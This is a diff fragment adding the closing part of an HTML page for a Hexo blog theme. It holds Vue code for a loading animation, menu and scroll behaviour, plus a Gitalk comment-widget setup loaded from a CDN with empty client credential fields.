+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: 'hexo-theme-particle',      // The repository of store comments,
+        owner: 'korilin',
+        admin: ['korilin'],
+        language: 'en',
+        id: location.pathname,      // Ensure uniqueness and length less than 50
+        distractionFreeMode: true  // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+
+</body>
+
+</html>
